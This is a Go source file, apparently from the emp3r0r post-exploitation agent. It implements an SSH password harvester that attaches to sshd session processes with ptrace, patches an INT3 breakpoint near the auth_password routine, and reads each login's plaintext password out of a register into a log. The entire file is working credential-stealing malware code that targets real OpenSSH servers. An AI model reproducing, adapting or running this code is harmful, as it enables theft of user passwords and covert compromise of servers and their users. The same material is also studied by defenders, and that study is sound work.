//go:build linux && amd64
// +build linux,amd64

package agent

import (
	"bytes"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"golang.org/x/sys/unix"
)

var (
	traced_pids     = make(map[int]bool)
	traced_pids_mut = &sync.RWMutex{}
)

func sshd_monitor(logStream chan string, code_pattern []byte) (err error) {
	alive, sshd_procs := util.IsProcAlive("sshd")
	if !alive {
		util.LogStreamPrintf(logStream, "sshd_monitor (%d): sshd process not found, aborting", unix.Getpid())
		return
	}

	util.LogStreamPrintf(logStream, "sshd_monitor started (%d)", unix.Getpid())
	monitor := func(sshd_pid int) {
		util.LogStreamPrintf(logStream, "Started monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_pid)
		for {
			util.TakeABlink()
			children_file := fmt.Sprintf("/proc/%d/task/%d/children", sshd_pid, sshd_pid)
			children_data, err := os.ReadFile(children_file)
			if err != nil {
				return
			}
			children_pids := strings.Fields(string(children_data))
			for _, child := range children_pids {
				child_pid, err := strconv.Atoi(child)
				if err == nil {
					traced_pids_mut.RLock()
					if !traced_pids[child_pid] {
						go sshd_harvester(child_pid, logStream, code_pattern)
					}
					traced_pids_mut.RUnlock()
				}
			}
		}
	}
	for _, sshd_proc := range sshd_procs {
		util.LogStreamPrintf(logStream, "Starting monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_proc.Pid)
		go monitor(int(sshd_proc.Pid))
	}

	for {
		util.TakeASnap()
	}
}

func sshd_harvester(pid int, logStream chan string, code_pattern []byte) {
	// remember pid
	traced_pids_mut.Lock()
	traced_pids[pid] = true
	traced_pids_mut.Unlock()

	if code_pattern == nil {
		code_pattern = []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
	}
	// code_pattern_littleendian := []byte{0x21, 0xc0, 0xb6, 0x0f, 0x08, 0xc4, 0x83, 0x48}
	util.LogStreamPrintf(logStream, "\n[+] Starting Harvester for SSHD session %d", pid)
	map_file := fmt.Sprintf("/proc/%d/maps", pid)
	map_data, err := os.ReadFile(map_file)
	if err != nil {
		util.LogStreamPrintf(logStream, "Failed to read memory map of %d: %v", pid, err)
		return
	}
	// parse memory map
	lines := strings.Split(string(map_data), "\n")
	var (
		ptr  uint64 // start of sshd process, start of code pattern
		pend uint64 // end of sshd process
	)
	for _, line := range lines {
		if strings.Contains(line, "/sshd") &&
			strings.Contains(line, "r-x") {
			f1 := strings.Fields(line)[0]
			if len(f1) < 2 {
				util.LogStreamPrintf(logStream, "error parsing line: %s", line)
				continue
			}
			start := strings.Split(f1, "-")[0]
			end := strings.Split(f1, "-")[1]
			ptr, err = strconv.ParseUint(start, 16, 64)
			if err != nil {
				util.LogStreamPrintf(logStream, "parsing pstart: %v", err)
				return
			}
			pend, err = strconv.ParseUint(end, 16, 64)
			if err != nil {
				util.LogStreamPrintf(logStream, "parsing pend: %v", err)
				return
			}
		}
	}
	util.LogStreamPrintf(logStream, "Harvester PID is %d", unix.Getpid())
	util.LogStreamPrintf(logStream, "SSHD process found in 0x%x - 0x%x", ptr, pend)
	pstart := ptr

	// #13 https://github.com/jm33-m0/emp3r0r/issues/13
	// fixes "no such process" error
	// this makes sure we don't lose our tracee
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	err = unix.PtraceAttach(pid)
	if err != nil {
		util.LogStreamPrintf(logStream, "failed to attach to %d: %v", pid, err)
		return
	}
	defer unix.PtraceDetach(pid)
	// wait for the process to stop
	wstatus := new(unix.WaitStatus)
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogStreamPrintf(logStream, "wait %d: %v", pid, err)
		return
	}
	switch {
	case wstatus.Exited():
		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
		return
	case wstatus.CoreDump():
		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
	case wstatus.Continued():
		util.LogStreamPrintf(logStream, "SSHD %d continues...", pid)
	case wstatus.Stopped():
		util.LogStreamPrintf(logStream, "SSHD %d has stopped on attach...", pid)
	}
	word := make([]byte, 8)
	util.LogStreamPrintf(logStream, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)

	// search for auth_password
	util.LogStreamPrintf(logStream, "Searching for auth_password")
	for ptr < pend {
		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
		if err != nil {
			util.LogStreamPrintf(logStream, "PTRACE_PEEKTEXT searching memory of %d: %v",
				pid, err)
			time.Sleep(time.Second)
		}
		if bytes.Equal(word, code_pattern) {
			util.LogStreamPrintf(logStream, "Got a hit (0x%x) at 0x%x", word, ptr)
			// now pstart is the start of our code pattern
			break
		}
		ptr++
	}
	if ptr == pend {
		util.LogStreamPrintf(logStream, "code pattern 0x%x not found in memory 0x%x to 0x%x",
			code_pattern, pstart, pend)
		return
	}

	// points to the start of our code pattern
	pcode_pattern := uintptr(ptr)
	// dump code at code pattern
	util.LogStreamPrintf(logStream, "Code pattern found at 0x%x", pcode_pattern)
	dump_code(pid, pcode_pattern, logStream)

	// before breakpoint, what does the code look like
	util.LogStreamPrintf(logStream, "Before setting the breakpoint, what does the code look like?")
	dump_code(pid, 0, logStream)

	// write breakpoint
	code_with_trap := make([]byte, 8)
	copy(code_with_trap, code_pattern)
	code_with_trap[0] = 0xCC
	// code_with_trap[len(code_with_trap)-1] = 0xCC
	util.LogStreamPrintf(logStream, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
	if err != nil {
		util.LogStreamPrintf(logStream, "patching code: %v", err)
		return
	}
	util.LogStreamPrintf(logStream, "INT3 written, breakpoint set")
	util.LogStreamPrintf(logStream, "Dumping code at code pattern 0x%x to check if bp has been set", pcode_pattern)
	dump_code(pid, pcode_pattern, logStream)
	util.LogStreamPrintf(logStream, "Resuming process to let it hit breakpoint")
	err = unix.PtraceCont(pid, int(unix.SIGCONT))
	if err != nil {
		util.LogStreamPrintf(logStream, "resuming process: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogStreamPrintf(logStream, "wait %d to hit breakpoint: %v", pid, err)
		return
	}
	switch {
	case wstatus.Exited():
		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
		return
	case wstatus.CoreDump():
		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
		return
	case wstatus.Continued():
		util.LogStreamPrintf(logStream, "SSHD %d continues...", pid)
	case wstatus.Stopped():
		util.LogStreamPrintf(logStream, "SSHD %d has hit breakpoint", pid)
	}

handler:
	success := false
	// where are we at
	util.LogStreamPrintf(logStream, "Dumping code at RIP after hitting breakpoint")
	dump_code(pid, 0, logStream)

	// read registers on break
	regs := new(unix.PtraceRegs)
	err = unix.PtraceGetRegs(pid, regs)
	if err != nil {
		util.LogStreamPrintf(logStream, "get regs: %v", err)
		return
	}
	password_reg := regs.Rbp
	pam_ret := regs.Rax

	// read password from RBP
	buf := make([]byte, 1)
	var password_bytes []byte
	util.LogStreamPrintf(logStream, "Extracting password from RBP (0x%x)", password_reg)
	for {
		_, err := unix.PtracePeekText(pid, uintptr(password_reg), buf)
		if err != nil {
			util.LogStreamPrintf(logStream, "reading password from RBP (0x%x): %v", password_reg, err)
			return
		}
		// until NULL is reached
		if buf[0] == 0 {
			break
		}
		password_bytes = append(password_bytes, buf...)
		password_reg++ // read next byte
	}
	password := string(password_bytes)
	if pam_ret == 0 {
		util.LogStreamPrintf(logStream, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
	} else {
		success = true
		util.LogStreamPrintf(logStream, "\n\nWe have password 0x%x (%s)\n\n", password, password)
	}
	// remove breakpoint
	util.LogStreamPrintf(logStream, "Removing breakpoint")
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern)
	if err != nil {
		util.LogStreamPrintf(logStream, "restoring code to remove breakpoint: %v", err)
		return
	}
	// one byte back, go back before 0xCC, at the start of code pattern
	regs.Rip--
	err = unix.PtraceSetRegs(pid, regs)
	if err != nil {
		util.LogStreamPrintf(logStream, "set regs back: %v", err)
		return
	}
	// single step to execute original code
	err = unix.PtraceSingleStep(pid)
	if err != nil {
		util.LogStreamPrintf(logStream, "single step: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogStreamPrintf(logStream, "wait %d to single step: %v", pid, err)
		return
	}
	util.LogStreamPrintf(logStream, "Single step done")

	// check if breakpoint is removed
	util.LogStreamPrintf(logStream, "Dumping code at code pattern 0x%x to check if bp has been removed", pcode_pattern)
	dump_code(pid, pcode_pattern, logStream)
	util.LogStreamPrintf(logStream, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)

	// add breakpoint back
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
	if err != nil {
		util.LogStreamPrintf(logStream, "patching code: %v", err)
		return
	}
	util.LogStreamPrintf(logStream, "Added breakpoint back")

	// continue sshd session process
	err = unix.PtraceCont(pid, int(unix.SIGCONT))
	if err != nil {
		util.LogStreamPrintf(logStream, "continue SSHD session: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogStreamPrintf(logStream, "wait %d to continue: %v", pid, err)
		return
	}
	switch {
	case wstatus.Stopped():
		if !success {
			goto handler
		}
	case wstatus.Exited():
		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
	case wstatus.CoreDump():
		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
	case wstatus.Continued():
		util.LogStreamPrintf(logStream, "SSHD %d core continues...", pid)
	default:
		util.LogStreamPrintf(logStream, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
	}
}

func dump_code(pid int, addr uintptr, log_stream chan string) {
	regs := new(unix.PtraceRegs)
	err := unix.PtraceGetRegs(pid, regs)
	if err != nil {
		util.LogStreamPrintf(log_stream, "dump code for %d failed: %v", pid, err)
		return
	}
	if addr == 0 {
		addr = uintptr(regs.Rip)
		util.LogStreamPrintf(log_stream, "Dumping code at RIP (0x%x)", addr)
	}
	util.LogStreamPrintf(log_stream, "Dumping registers: RIP=0x%x, RBP=0x%x, RAX=0x%x, RDI=0x%x, RSI=0x%x, RDX=0x%x, RCX=0x%x, R8=0x%x, R9=0x%x",
		regs.Rip, regs.Rbp, regs.Rax, regs.Rdi, regs.Rsi, regs.Rdx, regs.Rcx, regs.R8, regs.R9)
	code_bytes := make([]byte, 128)
	_, err = unix.PtracePeekText(pid, addr, code_bytes)
	if err != nil {
		util.LogStreamPrintf(log_stream, "dump code for %d failed: PEEKTEXT: %v", pid, err)
		return
	}
	util.LogStreamPrintf(log_stream, "Dumped code at 0x%x: 0x%x", addr, code_bytes)
}

func get_tracer_pid(pid int, log_stream chan string) (tracer_pid int) {
	// check tracer pid
	proc_status, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		util.LogStreamPrintf(log_stream, "get_tracer: %v", err)
		return
	}
	lines := strings.Split(string(proc_status), "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "TracerPid:") {
			tracer := strings.Fields(line)[1]
			tracer_pid, err = strconv.Atoi(tracer)
			if err != nil {
				util.LogStreamPrintf(log_stream, "Invalid tracer PID: %v", err)
				return
			}
			break
		}
	}

	return
}
